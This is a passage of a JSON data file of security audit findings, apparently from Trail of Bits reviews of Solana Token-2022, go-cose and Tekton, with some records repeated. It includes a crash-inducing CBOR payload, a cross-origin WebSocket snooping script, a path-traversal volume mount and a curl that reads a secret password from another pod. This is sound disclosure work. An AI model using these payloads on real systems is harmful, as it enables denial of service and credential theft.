        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "The comments on the MINT_WITH_EXTENSION variable are incorrect. See gure 9.1 for the incorrect comments, highlighted in red, and the corrected comments, highlighted in yellow. const MINT_WITH_EXTENSION: & [ u8 ] = &[ // base mint 1 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , ]; 1 , 1 , 1 , 1 , 1 , 42 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 7 , 1 , 1 , 0 , 0 , 0 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , // padding 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , // account type 1 , // extension type <== really account type 3 , 0 , // length <== really extension type 32 , 0 , // data <== really extension length 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , <== really extension data Figure 9.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/mod.rs#L828 -L841 Recommendations Short term, update the comments to align with the data. This will ensure that developers working on the tests will not be confused by the data structure.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. The Transfer and TransferWithFee instructions are identical ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "The implementations of the Transfer and TransferWithFee instructions are identical. Whether fees are used is determined by whether the mint has a TransferFeeConfig extension, regardless of the instruction used. ConfidentialTransferInstruction::Transfer => { msg!( \"ConfidentialTransferInstruction::Transfer\" ); #[cfg(feature = \"zk-ops\" )] { let data = decode_instruction_data::<TransferInstructionData>(input)?; process_transfer( program_id, accounts, data.new_source_decryptable_available_balance, data.proof_instruction_offset as i64, ) } #[cfg(not(feature = \"zk-ops\" ))] Err (ProgramError::InvalidInstructionData) } ConfidentialTransferInstruction::TransferWithFee => { msg!( \"ConfidentialTransferInstruction::TransferWithFee\" ); #[cfg(feature = \"zk-ops\" )] { let data = decode_instruction_data::<TransferInstructionData>(input)?; process_transfer( program_id, accounts, data.new_source_decryptable_available_balance, data.proof_instruction_offset as i64, ) } #[cfg(not(feature = \"zk-ops\" ))] { Err (ProgramError::InvalidInstructionData) } } Figure 10.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/confidentia l_transfer/processor.rs#L1192-L1223 Recommendations Short term, deprecate the TransferWithFee instruction, and update the documentation for the Transfer instruction to clarify the use of fees. This will ensure that contract users will not be misled in how the instructions are performed.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Some instructions operate only on the lo bits of balances ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "For condential transfers, the pending balance is split into lo and hi values: of the total 64 bits representing the value, lo contains the low 16 bits, and hi contains the high 48 bits. Some instructions seem to update only the lo bits. For example, the process_destination_for_transfer function updates only the pending_balance_lo eld of the destination_confidential_transfer_account account. Changing the ct_withdraw_withheld_tokens_from_accounts integration test so that the resulting fee is greater than u16::Max (and updating the test to account for other changes to account balances) breaks the test, which indicates that the pattern of updating only the lo bits is problematic. We found the same pattern in the process_withdraw_withheld_tokens_from_mint function for the destination_confidential_transfer_account account and in the process_withdraw_withheld_tokens_from_accounts function for the destination_confidential_transfer_account account. #[cfg(feature = \"zk-ops\" )] fn process_destination_for_transfer ( destination_token_account_info: & AccountInfo , mint_info: & AccountInfo , destination_encryption_pubkey: & EncryptionPubkey , destination_ciphertext_lo: & EncryptedBalance , destination_ciphertext_hi: & EncryptedBalance , encrypted_fee: Option <EncryptedFee>, ) -> ProgramResult { check_program_account(destination_token_account_info.owner)?; ... // subtract fee from destination pending balance let new_destination_pending_balance = ops::subtract( &destination_confidential_transfer_account.pending_balance_lo, &ciphertext_fee_destination, ) .ok_or(ProgramError::InvalidInstructionData)?; // add encrypted fee to current withheld fee let new_withheld_amount = ops::add( &destination_confidential_transfer_account.withheld_amount, &ciphertext_fee_withheld_authority, ) .ok_or(ProgramError::InvalidInstructionData)?; destination_confidential_transfer_account.pending_balance_lo = new_destination_pending_balance; destination_confidential_transfer_account.withheld_amount = new_withheld_amount; ... Figure 11.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L761-L777 Recommendations Short term, investigate the security implications of operating only on the lo bits in operations and determine whether this pattern should be changed.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Instruction susceptible to front-running ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "The code comments for the WithdrawWithheldTokensFromAccounts instruction state that the instruction is susceptible to front-running. The comments list two alternatives to the function HarvestWithheldTokensToMint and WithdrawWithheldTokensFromMint indicating that this vulnerable function could be deprecated. /// Transfer all withheld tokens to an account. Signed by the mint's withdraw withheld tokens /// authority. This instruction is susceptible to front-running. Use /// `HarvestWithheldTokensToMint` and `WithdrawWithheldTokensFromMint` as an alternative. /// /// Note on front-running: This instruction requires a zero-knowledge proof verification /// instruction that is checked with respect to the account state (the currently withheld /// fees). Suppose that a withdraw withheld authority generates the /// `WithdrawWithheldTokensFromAccounts` instruction along with a corresponding zero-knowledge /// proof for a specified set of accounts, and submits it on chain. If the withheld fees at any /// of the specified accounts change before the `WithdrawWithheldTokensFromAccounts` is /// executed on chain, the zero-knowledge proof will not verify with respect to the new state, /// forcing the transaction to fail. /// /// If front-running occurs, then users can look up the updated states of the accounts, /// generate a new zero-knowledge proof and try again. Alternatively, withdraw withheld /// authority can first move the withheld amount to the mint using /// `HarvestWithheldTokensToMint` and then move the withheld fees from mint to a specified /// destination account using `WithdrawWithheldTokensFromMint`. Figure 12.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/confidentia l_transfer/instruction.rs#L313-L330 Recommendations Short term, consider deprecating this instruction in favor of the alternatives suggested in the WithdrawWithheldTokensFromAccounts code comments, HarvestWithheldTokensToMint and WithdrawWithheldTokensFromMint . This will ensure that contract users who may have missed the comment describing the front-running vulnerability will not be exposed to the issue. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Unmarshalling can cause a panic if any header labels are unhashable ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf",
        "description": "The ensureCritical function checks that all critical labels exist in the protected header. The check for each label is shown in Figure 1.1. 161 if _, ok := h[label]; !ok { Figure 1.1: Line 161 of headers.go The label in this case is deserialized from the users CBOR input. If the label is a non-hashable type (e.g., a slice or a map), then Go will runtime panic on line 161. Exploit Scenario Alice wishes to crash a server running go-cose. She sends the following CBOR message to the server: \\xd2\\x84G\\xc2\\xa1\\x02\\xc2\\x84@0000C000C000. When the server attempts to validate the critical headers during unmarshalling, it panics on line 161. Recommendations Short term, add a validation step to ensure that the elements of the critical header are valid labels. Long term, integrate go-coses existing fuzz tests into the CI pipeline. Although this bug was not discovered using go-coses preexisting fuzz tests, the tests likely would have discovered it if they ran for enough time. Fix Analysis This issue has been resolved. Pull request #78, committed to the main branch in b870a00b4a0455ab5c3da1902570021e2bac12da, adds validations to ensure that critical headers are only integers or strings. 15 Microsoft go-cose Security Assessment (DRAFT)",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. crit label is permitted in unvalidated headers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf",
        "description": "The crit header parameter identies which header labels must be understood by an application receiving the COSE message. Per RFC 8152, this value must be placed in the protected header bucket, which is authenticated by the message signature. Figure 2.1: Excerpt from RFC 8152 section 3.1 Currently, the implementation ensures during marshaling and unmarshaling that if the crit parameter is present in the protected header, then all indicated labels are also present in the protected header. However, the implementation does not ensure that the crit parameter is not present in the unprotected bucket. If a user mistakenly uses the unprotected header for the crit parameter, then other conforming COSE implementations may reject the message and the message may be exposed to tampering. Exploit Scenario A library user mistakenly places the crit label in the unprotected header, allowing an adversary to manipulate the meaning of the message by adding, removing, or changing the set of critical headers. Recommendations Add a check during ensureCritical to verify that the crit label is not present in the unprotected header bucket. Fix Analysis This issue has been resolved. Pull request #81, committed to the main branch in 62383c287782d0ba5a6f82f984da0b841e434298, adds validations to ensure that the crit label is not present in unprotected headers. 16 Microsoft go-cose Security Assessment (DRAFT)",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Generic COSE header types are not validated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf",
        "description": "Section 3.1 of RFC 8152 denes a number of common COSE header parameters and their associated value types. Applications using the go-cose library may rely on COSE-dened headers decoded by the library to be of a specied type. For example, the COSE specication denes the content-type header (label #3) as one of two types: a text string or an unsigned integer. The go-cose library validates only the alg and crit parameters, not content-type. See Figure 3.1 for a list of dened header types. Figure 3.1: RFC 8152 Section 3.1, Table 2 Further header types are dened by the IANA COSE Header Parameter Registry. 17 Microsoft go-cose Security Assessment (DRAFT) Exploit Scenario An application uses go-cose to verify and validate incoming COSE messages. The application uses the content-type header to index a map, expecting the content type to be a valid string or integer. An attacker could, however, supply an unhashable value, causing the application to panic. Recommendations Short term, explicitly document which IANA-dened headers or label ranges are and are not validated. Long term, validate commonly used headers for type and semantic consistency. For example, once counter signatures are implemented, the counter-signature (label #7) header should be validated for well-formedness during unmarshalling. 18 Microsoft go-cose Security Assessment (DRAFT)",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. The use of time.After() in select statements can lead to memory leaks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "Calls to time.After in for/select statements can lead to memory leaks because the garbage collector does not clean up the underlying Timer object until the timer res. A new timer, which requires resources, is initialized at each iteration of the for loop (and, hence, the select statement). As a result, many routines originating from the time.After call could lead to overconsumption of the memory. for { select { case <-ctx.Done(): // When the context is cancelled, stop reporting. return case <-time.After(r.ReportingPeriod): // Every 30s surface a metric for the number of running pipelines. if err := r.RunningPipelineRuns(lister); err != nil { logger.Warnf(\"Failed to log the metrics : %v\", err) } Figure 1.1: tektoncd/pipeline/pkg/pipelinerunmetrics/metrics.go#L290-L300 for { select { case <-ctx.Done(): // When the context is cancelled, stop reporting. return case <-time.After(r.ReportingPeriod): // Every 30s surface a metric for the number of running tasks. if err := r.RunningTaskRuns(lister); err != nil { logger.Warnf(\"Failed to log the metrics : %v\", err) } } Figure 1.2: pipeline/pkg/taskrunmetrics/metrics.go#L380-L391 Exploit Scenario An attacker nds a way to overuse a function, which leads to overconsumption of the memory and causes Tekton Pipelines to crash. Recommendations Short term, consider refactoring the code that uses the time.After function in for/select loops using tickers. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, ensure that the time.After method is not used in for/select routines. Periodically use the Semgrep query to check for and detect similar patterns. References  Use with caution time.After Can cause memory leak (golang)  Golang <-time.After() is not garbage collected before expiry",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Risk of resource exhaustion due to the use of defer inside a loop ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "The ExecuteInterceptors function runs all interceptors congured for a given trigger inside a loop. The res.Body.Close() function is deferred at the end of the loop. Calling defer inside of a loop could cause resource exhaustion conditions because the deferred function is called when the function exits, not at the end of each loop. As a result, resources from each interceptor object are accumulated until the end of the for statement. While this may not cause noticeable issues in the current state of the application, it is best to call res.Body.Close() at the end of each loop to prevent unforeseen issues. func (r Sink) ExecuteInterceptors(trInt []*triggersv1.TriggerInterceptor, in *http.Request, event []byte, log *zap.SugaredLogger, eventID string, triggerID string, namespace string, extensions map[string]interface{}) ([]byte, http.Header, *triggersv1.InterceptorResponse, error) { if len(trInt) == 0 { return event, in.Header, nil, nil } // (...) for _, i := range trInt { if i.Webhook != nil { // Old style interceptor // (...) defer res.Body.Close() Figure 2.1: triggers/pkg/sink/sink.go#L428-L469 Recommendations Short term, rather than deferring the call to res.Body.Close(), add a call to res.Body.Close() at the end of the loop.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Lack of access controls for Tekton Pipelines API ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "The Tekton Pipelines extension uses an API to process requests for various tasks such as listing namespaces and creating TaskRuns. While Tekton provides documentation on enabling OAuth2 authentication, the API is unauthenticated by default. Should a Tekton operator expose the dashboard for other users to monitor their own deployments, every API method would be available to them, allowing them to perform tasks on namespaces that they do not have access to. Figure 3.1: Successful unauthenticated request Exploit Scenario An attacker discovers the endpoint exposing the Tekton Pipelines API and uses it to perform destructive tasks such as deleting PipelineRuns. Furthermore, the attacker can discover potentially sensitive information pertaining to deployments congured in Tekton. Recommendations Short term, add documentation on securing access to the API using Kubernetes security controls, including explicit documentation on the security implications of exposing access to the dashboard and, therefore, the API. Long term, add an access control mechanism for controlling who can access the API and limiting access to namespaces as needed and/or possible. 4. Insu\u0000cient validation of volumeMounts paths Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-4 Target: Various",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Missing validation of Origin header in WebSocket upgrade requests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "Tekton Dashboard uses the WebSocket protocol to provide real-time updates for TaskRuns, PipelineRuns, and other Tekton data. The endpoints responsible for upgrading the incoming HTTP request to a WebSocket request do not validate the Origin header to ensure that the request is coming from a trusted origin (i.e., the dashboard itself). As a result, arbitrary malicious web pages can connect to Tekton Dashboard and receive these real-time updates, which may include sensitive information, such as the log output of TaskRuns and PipelineRuns. Exploit Scenario A user hosts Tekton Dashboard on a private address, such as one in a local area network or a virtual private network (VPN), without enabling application-layer authentication. An attacker identies the URL of the dashboard instance (e.g., http://192.168.3.130:9097) and hosts a web page with the following content: <script> var ws = new WebSocket(\"ws://192.168.3.130:9097/apis/tekton.dev/v1beta1/namespaces/tekton-pipelin es/pipelineruns/?watch=true&resourceVersion=1770\"); ws.onmessage = function (event) { console.log(event.data); } </script> Figure 5.1: A malicious web page that extracts Tekton Dashboard WebSocket updates The attacker convinces the user to visit the web page. Upon loading it, the users browser successfully connects to the Tekton Dashboard WebSocket endpoint for monitoring PipelineRuns and logs received messages to the JavaScript console. As a result, the attackers untrusted web origin now has access to real-time updates from a dashboard instance on a private network that would otherwise be inaccessible outside of that network. Figure 5.2: The untrusted origin http://localhost:8080 has access to Tekton Dashboard WebSocket messages. Recommendations Short term, modify the code so that it veries that the Origin header of WebSocket upgrade requests corresponds to the trusted origin on which Tekton Dashboard is served. For example, if the origin is not http://192.168.3.130:9097, Tekton Dashboard should reject the incoming request. 6. Import resources feature does not validate repository URL scheme Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-6 Target: Dashboard",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Tekton allows users to create privileged containers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "Tekton allows users to dene task and sidecar objects with a privileged security context, which eectively grants task containers all capabilities. Tekton operators can use admission controllers to disallow users from using this option. However, information on this mitigation in the guidance documents for Tekton Pipelines is insucient and should be made clear. If an attacker gains code execution on any of these containers, the attacker could break out of it and gain full access to the host machine. We were not able to escape step containers running in privileged mode during the time allotted for this audit. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: build-push-secret-10 spec: serviceAccountName: build-bot taskSpec: steps: - name: secret securityContext: privileged: true image: ubuntu script: | #!/usr/bin/env bash sleep 20m Figure 8.1: TaskRun denition with the privileged security context root@build-push-secret-10-pod:/proc/fs# find -type f -maxdepth 5 -writable find: warning: you have specified the global option -maxdepth after the argument -type, but global options are not positional, i.e., -maxdepth affects tests specified before it as well as those specified after it. Please specify global options before other arguments. ./xfs/xqm ./xfs/xqmstat ./cifs/Stats ./cifs/cifsFYI ./cifs/dfscache ./cifs/traceSMB ./cifs/DebugData ./cifs/open_files ./cifs/SecurityFlags ./cifs/LookupCacheEnabled ./cifs/LinuxExtensionsEnabled ./ext4/vda1/fc_info ./ext4/vda1/options ./ext4/vda1/mb_groups ./ext4/vda1/es_shrinker_info ./jbd2/vda1-8/info ./fscache/stats Figure 8.2: With the privileged security context in gure 8.1, it is now possible to write to several les in /proc/fs, for example. Exploit Scenario A malicious developer runs a TaskRun with a privileged security context and obtains shell access to the container. Using one of various known exploits, he breaks out of the container and gains root access on the host. Recommendations Short term, create clear, easy-to-locate documentation warning operators about allowing developers and other users to dene a privileged security context for step containers, and include guidance on how to restrict such a feature. 9. Insu\u0000cient default network access controls between pods Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-TKN-9 Target: Pipelines",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "11. Lack of rate-limiting controls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "Tekton Dashboard does not enforce rate limiting of HTTP requests. As a result, we were able to issue over a thousand requests in just over a minute. Figure 11.1: We sent over a thousand requests to Tekton Dashboard without being rate limited. Processing requests sent at such a high rate can consume an inordinate amount of resources, increasing the risk of denial-of-service attacks through excessive resource consumption. In particular, we were able to create hundreds of running import resources pods that were able to consume nearly all the hosts memory in the span of a minute. Exploit Scenario An attacker oods a Tekton Dashboard instance with HTTP requests that execute pipelines, leading to a denial-of-service condition. Recommendations Short term, implement rate limiting on all API endpoints. Long term, run stress tests to ensure that the rate limiting enforced by Tekton Dashboard is robust.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Lack of maximum request and response body constraint ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "The ioutil.ReadAll function reads from source until an error or an end-of-le (EOF) condition occurs, at which point it returns the data that it read. This function is used in dierent les of the Tekton Triggers and Tekton Pipelines codebases to read requests and responses. There is no limit on the maximum size of request and response bodies, so using ioutil.ReadAll to parse requests and responses could cause a denial of service (due to insucient memory). A denial of service could also occur if an exhaustive resource is loaded multiple times. This method is used in the following locations of the codebase: File pkg/remote/oci/resolver.go:L211 pkg/sink/sink.go:147,465 Project Pipelines Triggers pkg/interceptors/webhook/webhook.go:77 Triggers pkg/interceptors/interceptors.go:176 Triggers pkg/sink/validate_payload.go:29 cmd/binding-eval/cmd/root.go:141 cmd/triggerrun/cmd/root.go:182 Triggers Triggers Triggers Recommendations Short term, place a limit on the maximum size of request and response bodies. For example, this limit can be implemented by using the io.LimitReader function. Long term, place limits on request and response bodies globally in other places within the application to prevent denial-of-service attacks.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Lack of access controls for Tekton Pipelines API ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "The Tekton Pipelines extension uses an API to process requests for various tasks such as listing namespaces and creating TaskRuns. While Tekton provides documentation on enabling OAuth2 authentication, the API is unauthenticated by default. Should a Tekton operator expose the dashboard for other users to monitor their own deployments, every API method would be available to them, allowing them to perform tasks on namespaces that they do not have access to. Figure 3.1: Successful unauthenticated request Exploit Scenario An attacker discovers the endpoint exposing the Tekton Pipelines API and uses it to perform destructive tasks such as deleting PipelineRuns. Furthermore, the attacker can discover potentially sensitive information pertaining to deployments congured in Tekton. Recommendations Short term, add documentation on securing access to the API using Kubernetes security controls, including explicit documentation on the security implications of exposing access to the dashboard and, therefore, the API. Long term, add an access control mechanism for controlling who can access the API and limiting access to namespaces as needed and/or possible.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Insu\u0000cient validation of volumeMounts paths ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "The Tekton Pipelines extension performs a number of validations against task steps whenever a task is submitted for Tekton to process. One such validation veries that the path for a volume mount is not inside the /tekton directory. This directory is treated as a special directory by Tekton, as it is used for Tekton-specic functionality. However, the extension uses strings.HasPrefix to verify that MountPath does not contain the string /tekton/ without rst sanitizing it. As a result, it is possible to create volume mounts inside /tekton by using path traversal strings such as /somedir/../tekton/newdir in the volumeMounts variable of a task step denition. for j, vm := range s.VolumeMounts { if strings.HasPrefix(vm.MountPath, \"/tekton/\") && !strings.HasPrefix(vm.MountPath, \"/tekton/home\") { errs = errs.Also(apis.ErrGeneric(fmt.Sprintf(\"volumeMount cannot be mounted under /tekton/ (volumeMount %q mounted at %q)\", vm.Name, vm.MountPath), \"mountPath\").ViaFieldIndex(\"volumeMounts\", j)) } if strings.HasPrefix(vm.Name, \"tekton-internal-\") { errs = errs.Also(apis.ErrGeneric(fmt.Sprintf(`volumeMount name %q cannot start with \"tekton-internal-\"`, vm.Name), \"name\").ViaFieldIndex(\"volumeMounts\", j)) } } Figure 4.1: pipeline/pkg/apis/pipeline/v1beta1/task_validation.go#L218-L226 The YAML le in the gure below was used to create a volume in the reserved /tekton directory. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: vol-test spec: taskSpec: steps: - image: docker name: client workingDir: /workspace script: | #!/usr/bin/env sh sleep 15m volumeMounts: - mountPath: /certs/client/../../../tekton/mytest name: empty-path volumes: - name: empty-path emptyDir: {} Figure 4.2: Task run le used to create a volume mount inside an invalid location The gure below demonstrates that the previous le successfully created the mytest directory inside of the /tekton directory by using a path traversal string. $ kubectl exec -i -t vol-test -- /bin/sh Defaulted container \"step-client\" out of: step-client, place-tools (init), step-init (init), place-scripts (init) /workspace # cd /tekton/ /tekton # ls bin creds downward home scripts steps termination results run mytest Figure 4.3: Logging into the task pod container, we can now list the mytest directory inside of /tekton. Recommendations Short term, modify the code so that it converts the mountPath string into a le path and uses a function such as filepath.Clean to sanitize and canonicalize it before validating it.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Insu\u0000cient security hardening of step containers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "Containers used for running task and pipeline steps have excessive security context options enabled. This increases the attack surface of the system, and issues such as Linux kernel bugs may allow attackers to escape a container if they gain code execution within a Tekton container. The gure below shows the security properties of a task container with the docker driver. 0 0 0 0 0 0 cat 0 0 # cat /proc/self/status | egrep 'Name|Uid|Gid|Groups|Cap|NoNewPrivs|Seccomp' Name: Uid: Gid: Groups: CapInh: 00000000a80425fb CapPrm: 00000000a80425fb CapEff: 00000000a80425fb CapBnd: 00000000a80425fb CapAmb: 0000000000000000 NoNewPrivs: 0 0 Seccomp: Seccomp_filters: 0 Figure 7.1: The security properties of one of the step containers Exploit Scenario Eve nds a bug that allows her to run arbitrary code on behalf of a conned process within a container, using it to gain more privileges in the container and then to attack the host. Recommendations Short term, drop default capabilities from containers and prevent processes from gaining additional privileges by setting the --cap-drop=ALL and --security-opt=no-new-privileges:true ags when starting containers. Long term, review and implement the Kubernetes security recommendations in appendix C.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Tekton allows users to create privileged containers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "Tekton allows users to dene task and sidecar objects with a privileged security context, which eectively grants task containers all capabilities. Tekton operators can use admission controllers to disallow users from using this option. However, information on this mitigation in the guidance documents for Tekton Pipelines is insucient and should be made clear. If an attacker gains code execution on any of these containers, the attacker could break out of it and gain full access to the host machine. We were not able to escape step containers running in privileged mode during the time allotted for this audit. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: build-push-secret-10 spec: serviceAccountName: build-bot taskSpec: steps: - name: secret securityContext: privileged: true image: ubuntu script: | #!/usr/bin/env bash sleep 20m Figure 8.1: TaskRun denition with the privileged security context root@build-push-secret-10-pod:/proc/fs# find -type f -maxdepth 5 -writable find: warning: you have specified the global option -maxdepth after the argument -type, but global options are not positional, i.e., -maxdepth affects tests specified before it as well as those specified after it. Please specify global options before other arguments. ./xfs/xqm ./xfs/xqmstat ./cifs/Stats ./cifs/cifsFYI ./cifs/dfscache ./cifs/traceSMB ./cifs/DebugData ./cifs/open_files ./cifs/SecurityFlags ./cifs/LookupCacheEnabled ./cifs/LinuxExtensionsEnabled ./ext4/vda1/fc_info ./ext4/vda1/options ./ext4/vda1/mb_groups ./ext4/vda1/es_shrinker_info ./jbd2/vda1-8/info ./fscache/stats Figure 8.2: With the privileged security context in gure 8.1, it is now possible to write to several les in /proc/fs, for example. Exploit Scenario A malicious developer runs a TaskRun with a privileged security context and obtains shell access to the container. Using one of various known exploits, he breaks out of the container and gains root access on the host. Recommendations Short term, create clear, easy-to-locate documentation warning operators about allowing developers and other users to dene a privileged security context for step containers, and include guidance on how to restrict such a feature.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Insu\u0000cient default network access controls between pods ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "description": "By default, containers deployed as part of task steps do not have any egress or ingress network restrictions. As a result, containers could reach services exposed over the network from any task step container. For instance, in gure 9.2, a user logs into a container running a task step in the developer-group namespace and successfully makes a request to a service in a step container in the qa-group namespace. root@build-push-secret-35-pod:/# ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 172.17.0.17 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:11 txqueuelen 0 (Ethernet) RX packets 21831 bytes 32563599 (32.5 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 6465 bytes 362926 (362.9 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 root@build-push-secret-35-pod:/# python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... 172.17.0.16 - - [08/Mar/2022 01:03:50] \"GET /tekton/creds-secrets/basic-user-pass-canary/password HTTP/1.1\" 200 - 172.17.0.16 - - [08/Mar/2022 01:04:05] \"GET /tekton/creds-secrets/basic-user-pass-canary/password HTTP/1.1\" 200 - Figure 9.1: Exposing a simple server in a step container in the developer-group namespace root@build-push-secret-35-pod:/# curl 172.17.0.17:8000/tekton/creds-secrets/basic-user-pass-canary/password mySUPERsecretPassword Figure 9.2: Reaching the service exposed in gure 9.1 from another container in the qa-group namespace Exploit Scenario An attacker launches a malicious task container that reaches a service exposed via a sidecar container and performs unauthorized actions against the service. Recommendations Short term, enforce ingress and egress restrictions to allow only resources that need to speak to each other to do so. Leverage allowlists instead of denylists to ensure that only expected components can establish these connections. Long term, ensure the use of appropriate methods of isolation to prevent lateral movement. 10. Import resources\" feature does not validate repository path Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-10 Target: Dashboard",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Nil dereferences in the trigger interceptor logic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
